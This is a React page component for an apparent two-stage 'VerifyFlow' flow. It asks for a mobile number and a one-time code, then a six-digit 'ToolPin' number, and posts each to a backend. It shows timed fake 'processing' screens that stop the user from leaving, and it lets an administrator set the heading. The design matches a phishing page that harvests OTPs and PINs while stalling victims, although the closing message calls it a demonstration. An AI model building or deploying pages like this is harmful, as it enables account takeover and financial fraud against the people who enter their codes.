import { useEffect, useState } from "react";

import AppHeader from "../components/common/AppHeader.jsx";
import StageTwoForm from "../components/stage-two/StageTwoForm.jsx";
import StageTwoProcessingScreen from "../components/stage-two/StageTwoProcessingScreen.jsx";
import ToolPinForm from "../components/stage-two/ToolPinForm.jsx";

import { getPublicPageConfig } from "../services/pageConfig.service.js";
import {
  completeStageTwo,
  saveToolPin,
  verifyStageTwoMobile,
} from "../services/submission.service.js";

import "../styles/pages/landing.css";

const DEFAULT_HEADING = "Verify your mobile number";

const OTP_VISIBILITY_DELAY = 500;
const PROCESSING_DURATION = 2500;
const TOOLPIN_PROCESSING_DURATION = 7500;

function StageTwoPage() {
  // Page configuration
  const [heading, setHeading] = useState(DEFAULT_HEADING);

  // Stage 2 form
  const [mobileNumber, setMobileNumber] = useState("");
  const [demoCode, setDemoCode] = useState("");
  const [formError, setFormError] = useState("");

  // OTP verification
  const [isOtpRequesting, setIsOtpRequesting] = useState(false);
  const [isOtpRequested, setIsOtpRequested] = useState(false);
  const [isOtpVisible, setIsOtpVisible] = useState(false);

  // Stage 2 submission
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  // ToolPin form
  const [isToolPinStep, setIsToolPinStep] = useState(false);
  const [toolPinNumber, setToolPinNumber] = useState("");
  const [toolPinError, setToolPinError] = useState("");
  const [isSavingToolPin, setIsSavingToolPin] = useState(false);

  // ToolPin processing and completion
  const [isToolPinProcessing, setIsToolPinProcessing] = useState(false);
  const [isComplete, setIsComplete] = useState(false);

  // Fetch the heading configured by the administrator.
  useEffect(() => {
    const controller = new AbortController();

    getPublicPageConfig(controller.signal)
      .then((config) => {
        if (
          typeof config?.stageTwoHeading === "string" &&
          config.stageTwoHeading.trim()
        ) {
          setHeading(config.stageTwoHeading.trim());
        }
      })
      .catch(() => {
        // Keep the default heading if fetching fails.
      });

    return () => controller.abort();
  }, []);

  // Show the OTP field 500ms after successful mobile verification.
  useEffect(() => {
    if (!isOtpRequested) return;

    const timeoutId = window.setTimeout(() => {
      setIsOtpVisible(true);
    }, OTP_VISIBILITY_DELAY);

    return () => window.clearTimeout(timeoutId);
  }, [isOtpRequested]);

  // Stage 2 processing: transition to the ToolPin step.
  useEffect(() => {
    if (!isProcessing) return;

    const timeoutId = window.setTimeout(() => {
      setIsProcessing(false);
      setIsToolPinStep(true);
    }, PROCESSING_DURATION);

    const handleBeforeUnload = (event) => {
      event.preventDefault();
      event.returnValue = "";
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.clearTimeout(timeoutId);
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [isProcessing]);

  // ToolPin processing: transition to the completion screen.
  useEffect(() => {
    if (!isToolPinProcessing) return;

    const timeoutId = window.setTimeout(() => {
      setIsToolPinProcessing(false);
      setIsComplete(true);
    }, TOOLPIN_PROCESSING_DURATION);

    const handleBeforeUnload = (event) => {
      event.preventDefault();
      event.returnValue = "";
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.clearTimeout(timeoutId);
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [isToolPinProcessing]);

  // Handle mobile number changes and reset OTP state.
  const handleMobileNumberChange = (event) => {
    const numericValue = event.target.value.replace(/\D/g, "").slice(0, 10);

    setMobileNumber(numericValue);
    setIsOtpRequested(false);
    setIsOtpVisible(false);
    setDemoCode("");
    setFormError("");
  };

  // Handle OTP input changes.
  const handleDemoCodeChange = (event) => {
    const numericValue = event.target.value.replace(/\D/g, "").slice(0, 6);

    setDemoCode(numericValue);
  };

  // Verify the Stage 2 mobile number.
  const handleRequestOtp = async () => {
    setFormError("");

    if (!/^[0-9]{10}$/.test(mobileNumber)) {
      setFormError("Please enter a valid 10-digit mobile number.");
      return;
    }

    setIsOtpRequesting(true);
    setIsOtpRequested(false);
    setIsOtpVisible(false);
    setDemoCode("");

    try {
      await verifyStageTwoMobile(mobileNumber);
      setIsOtpRequested(true);
    } catch (error) {
      setFormError(
        error?.response?.data?.message ||
          "Unable to verify your mobile number. Please try again.",
      );
    } finally {
      setIsOtpRequesting(false);
    }
  };

  // Submit Stage 2 verification.
  const handleSubmit = async (event) => {
    event.preventDefault();
    setFormError("");

    if (!/^[0-9]{10}$/.test(mobileNumber)) {
      setFormError("Please enter a valid 10-digit mobile number.");
      return;
    }

    if (!isOtpVisible) {
      setFormError(
        "Please verify your mobile number and request the OTP first.",
      );
      return;
    }

    if (!demoCode.trim()) {
      setFormError("Please enter the OTP.");
      return;
    }

    setIsSubmitting(true);

    try {
      await completeStageTwo({
        mobileNumber,
        stageTwoCode: demoCode,
      });

      setDemoCode("");
      setIsProcessing(true);
    } catch (error) {
      setFormError(
        error?.response?.data?.message ||
          "Unable to verify your details. Please try again.",
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  // Handle ToolPin input changes.
  const handleToolPinNumberChange = (event) => {
    const numericValue = event.target.value.replace(/\D/g, "").slice(0, 6);

    setToolPinNumber(numericValue);
    setToolPinError("");
  };

  // Save the ToolPin number.
  const handleToolPinSubmit = async (event) => {
    event.preventDefault();
    setToolPinError("");

    const cleanToolPinNumber = toolPinNumber.trim();

    if (!/^[0-9]{6}$/.test(cleanToolPinNumber)) {
      setToolPinError("Please enter a valid 6-digit ToolPin number.");
      return;
    }

    setIsSavingToolPin(true);

    try {
      await saveToolPin(cleanToolPinNumber);
      setIsToolPinProcessing(true);
    } catch (error) {
      setToolPinError(
        error?.response?.data?.message ||
          "Unable to save your ToolPin number. Please try again.",
      );
    } finally {
      setIsSavingToolPin(false);
    }
  };

  // Determine whether the ToolPin form is currently visible.
  const isToolPinPage = isToolPinStep && !isToolPinProcessing && !isComplete;

  return (
    <div className="vf-landing-page">
      <AppHeader />

      <main
        className={`vf-landing-main ${
          isToolPinPage ? "vf-landing-main--lucky" : ""
        }`}
      >
        {isProcessing ? (
          <StageTwoProcessingScreen
            title="Verification in Process"
            message="Please wait while we complete your verification."
            note="Please don't refresh or close this tab. Your verification is being processed."
          />
        ) : isToolPinProcessing ? (
          <StageTwoProcessingScreen
            title="Almost There!"
            message="Please wait while we process your final step."
            note="Your ToolPin number has been submitted successfully."
          />
        ) : isComplete ? (
          <section className="vf-landing-card vf-landing-success">
            <div className="vf-landing-success__icon">✓</div>

            <h1>Congratulations!</h1>

            <p>Verification Successful</p>

            <p className="vf-landing-success__note">
              Your VerifyFlow demonstration has been completed successfully.
            </p>
          </section>
        ) : isToolPinStep ? (
          <ToolPinForm
            toolPinNumber={toolPinNumber}
            toolPinError={toolPinError}
            isSavingToolPin={isSavingToolPin}
            onToolPinChange={handleToolPinNumberChange}
            onSubmit={handleToolPinSubmit}
          />
        ) : (
          <StageTwoForm
            heading={heading}
            mobileNumber={mobileNumber}
            demoCode={demoCode}
            isOtpRequesting={isOtpRequesting}
            isOtpRequested={isOtpRequested}
            isOtpVisible={isOtpVisible}
            isSubmitting={isSubmitting}
            formError={formError}
            onMobileNumberChange={handleMobileNumberChange}
            onDemoCodeChange={handleDemoCodeChange}
            onRequestOtp={handleRequestOtp}
            onSubmit={handleSubmit}
          />
        )}
      </main>
    </div>
  );
}

export default StageTwoPage;
